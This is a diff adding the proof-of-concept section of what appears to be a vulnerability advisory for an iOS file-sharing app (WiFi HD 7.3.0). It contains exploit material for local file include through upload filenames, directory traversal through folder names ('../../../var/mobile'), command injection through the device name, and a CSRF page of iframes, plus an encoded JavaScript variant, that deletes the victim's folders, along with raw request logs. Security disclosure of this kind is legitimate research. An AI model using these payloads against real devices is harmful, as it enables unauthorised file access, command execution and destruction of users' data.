@@ -1,0 +1,132 @@
+Proof of Concept (PoC):
+=======================
+1.1
+The local file include web vulnerability can be exploited by local attackers without privileged application user 
+account or user interaction.
+For security demonstration or to reproduce the security vulnerability follow the provided information and steps below 
+to continue.
+
+PoC: (Current Directory: Home/) < Upload File > Submit
+<a href="<iframe src=a>.png"><./[LOCAL FILE INCLUDE VULNERABILITY VIA FILENAME VALUE!]">.png</a></td>
+<td>[<a href="!DEL!./[LOCAL FILE INCLUDE VULNERABILITY VIA FILENAME VALUE!].png">X</a>] </td>
+<td align=right>0.5 Kb</td> </tr><tr><td><a href="asdasd-+%3C./[LOCAL FILE INCLUDE VULNERABILITY VIA FILENAME 
+VALUE!]%3E/</a></td>
+<td>[<a href="!DEL!asdasd-+%3C./[LOCAL FILE INCLUDE VULNERABILITY VIA FILENAME VALUE!]%3E/">X</a>] </td><td 
+align=right> </td> </tr>
+<tr><td colspan=3><hr></td></tr><tr><form action="" method="post" enctype="multipart/form-data" 
+name="form1" id="form1"></tr><tr><td><label>Select a file to upload: <input type="file" name="file" id="file" /></label>
+<label><input type="submit" name="button" id="button" value="Submit" /></label></td></tr></form><tr><td 
+colspan=4><hr></td></tr><tr><form action="" method="post" name="form2" id="form2"><td>Enter folder name: <input 
+type="text" 
+name="foldername" id="foldername" /><input type="submit" name="button" id="button" 
+value="Create Folder" /></td></form></tr></table></body></html></iframe></a>
+
+
+--- PoC Session Logs [POST] ---
+Status: 200[OK]
+POST http://www.example.com/ Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[2080] Mime 
+Type[application/x-unknown-content-type]
+   Request Header:
+      Host[www.example.com]
+      User-Agent
+
+[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+    
+
+  Referer[http://www.example.com/]
+      Connection[keep-alive]
+   POST-Daten:
+      POST_DATA[-----------------------------24623207791791
+Content-Disposition: form-data; name="file"; filename="./[LOCAL FILE INCLUDE VULNERABILITY VIA FILENAME VALUE!].png"
+Content-Type: image/png
+
+
+
+1.2
+The directory traversal web vulnerability can be exploited by local attackers in the wifi without privileged 
+application user account or user interaction.
+For security demonstration or to reproduce the security vulnerability follow the provided information and steps below 
+to continue.
+
+PoC: Enter Folder Name > Create New Folder (Current Directory: http://www.example.com/../../../var/mobile/x)
+
+Status: 200[OK]
+ POST http://www.example.com/ Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[1926] Mime 
+Type[application/x-unknown-content-type]
+   Request Header:
+      Host[www.example.com]
+      User-Agent
+
+[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+    
+
+  Referer[http://www.example.com/]
+      Connection[keep-alive]
+   POST-Daten:
+      foldername[..%2F..%2F..%2Fvar%2Fmobile%2Fx]
+      button[Create+Folder]
+   Response Header:
+      Accept-Ranges[bytes]
+      Content-Length[1926]
+      Date[Mo., 
+
+28 Juli 2014 12:33:06 GMT]
+
+
+
+
+1.3
+The local command inject web vulnerability can be exploited by local attackers with physical device access and 
+restricted user account without user interaction.
+For security demonstration or to reproduce the security vulnerability follow the provided information and steps below 
+to continue.
+
+Manual steps to reproduce the vulnerability ...
+1. Install the mobile application v7.3.0 to your iOS device (https://itunes.apple.com/us/app/wifi-hd/id310425060)
+2. Activate the wifi in your iOS device
+3. Setup a new iOS devicename through the options in the settings > info module
+4. Include as new devicename your local command to inject on application-side
+5. Open another iOS device and surf to the www.example.com url
+6. The via devicename values injected command executes in the header location were the device information becomes 
+visible
+7. Successful reproduce of the local command inject vulnerability in the iOS application!
+
+PoC: Index (http://www.example.com/)
+<h1>Files on iPhone: bkm337<[LOCAL COMMAND INJECT VULNERABILITY!]"></h1></td></tr>
+<tr><td>The following files are hosted live from the iPhone's Docs folder.</td></tr><tr><td colspan=3><hr></td>
+
+
+
+1.4
+The client-side cross site request forgery vulnerability can be exploited by remote attackers without privileged 
+application user account and medium or 
+high user interaction. For security demonstration or to reproduce the security vulnerability follow the provided 
+information and steps below to continue.
+
+PoC:
+<html>
+<head><body>
+<title>CSRF DELETE FOLDERS - PoC</title>
+<iframe src=http://www.example.com:8080/!DEL!1/>
+<iframe src=http://www.example.com:8080/!DEL!2/>
+<iframe src=http://www.example.com:8080/!DEL!3/>
+<iframe src=http://www.example.com:8080/!DEL!4/>
+<iframe src=http://www.example.com:8080/!DEL!5/>
+<iframe src=http://www.example.com:8080/!DEL!6/>
+</body></head>
+<html>
+
+... or
+
+<script 
+language=JavaScript>m='%3Chtml%3E%0A%3Chead%3E%3Cbody%3E%0A%3Ctitle%3ECSRF%20DELETE%20FOLDERS%20-%20PoC%3C/title%3E%0A
+%3Ciframe%20src%3Dhttp%3A//www.example.com%3A8080/%21DEL%211/%3E%0A%3Ciframe%20src%3Dhttp%3A//www.example.com%3A8080/%21DEL%212/%3E%0A
+%3Ciframe%20src%3Dhttp%3A//www.example.com%3A8080/%21DEL%213/%3E%0A%3Ciframe%20src%3Dhttp%3A//www.example.com%3A8080/%21DEL%214/%3E%0A
+%3Ciframe%20src%3Dhttp%3A//www.example.com%3A8080/%21DEL%215/%3E%0A%3Ciframe%20src%3Dhttp%3A//www.example.com%3A8080/%21DEL%216/%3E%0A
+%3C/body%3E%3C/head%3E%0A%3Chtml%3E';d=unescape(m);document.write(d);</script>
